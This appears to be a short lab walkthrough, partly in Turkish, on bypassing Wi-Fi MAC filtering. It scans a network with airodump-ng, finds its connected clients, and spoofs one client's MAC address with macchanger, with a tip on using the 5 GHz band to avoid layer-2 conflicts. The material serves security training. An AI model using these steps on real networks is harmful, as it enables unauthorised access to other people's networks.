# Bypassing MAC Filtering

## Scanning

```sh
my@attack:~$ sudo airodump-ng wlp0s20f0u3mon
```

```output title="Output" hl_lines="5 9"
 CH 13 ][ Elapsed: 1 min ][ 2025-04-22 09:34

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -47       24        9    0   1   54   WPA2 CCMP   PSK  CyberNet-Secure

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  8A:3B:40:2D:1C:30  -29    0 - 1     52       10         CyberNet-Secure
 D8:D6:3D:EB:29:D5  A6:34:18:9B:3E:E1  -29    0 -48     27        5         CyberNet-Secure
 D8:D6:3D:EB:29:D5  B2:B7:A8:14:CB:30  -29    0 - 1     24        9         CyberNet-Secure
 D8:D6:3D:EB:29:D5  62:FD:62:EE:33:F6  -29   54 -48      0        7         CyberNet-Secure
```

## Scanning (5 GHz)

```sh
my@attack:~$ sudo airodump-ng wlp0s20f0u3mon --band a
```

```output title="Output" hl_lines="5 9"
 CH 55 ][ Elapsed: 1 min ][ 2025-04-22 09:48

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -28        9        0    0  48   54   WPA2 CCMP   PSK  CyberNet-Secure-5G

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   8A:3B:40:2D:1C:30  -29    0 - 1     28        3         CyberNet-Secure
 (not associated)   A6:34:18:9B:3E:E1  -29    0 - 1     28        3         CyberNet-Secure
 (not associated)   B2:B7:A8:14:CB:30  -29    0 - 1     28        3         CyberNet-Secure
 (not associated)   62:FD:62:EE:33:F6  -29    0 - 1     28        3         CyberNet-Secure
```

## Stopping Monitor Mode

```sh
my@attack:~$ sudo airmon-ng stop wlp0s20f0u3mon
```

## Disabling Interface

```sh
my@attack:~$ sudo ifconfig wlp0s20f0u3 down
```

## [MAC Changer](https://github.com/alobbs/macchanger)

!!! warning

    Hedef istemci bu ağa bağlıdır:

    * CyberNet-Secure
    * 2.4 GHz
    * D8:D6:3D:EB:29:D5

    Katman 2 düzeyinde çakışma olmaması için bu ağa bağlan:

    * CyberNet-Secure-5G
    * 5 GHz
    * D8:D6:3D:EB:29:D5

```sh
my@attack:~$ sudo macchanger wlp0s20f0u3 -m 8A:3B:40:2D:1C:30
```

```output title="Output" hl_lines="3"
Current MAC:   42:00:00:00:05:00 (unknown)
Permanent MAC: 42:00:00:00:05:00 (unknown)
New MAC:       8a:3b:40:2d:1c:30 (unknown)
```

## Enabling Interface

```sh
my@attack:~$ sudo ifconfig wlp0s20f0u3 up
```
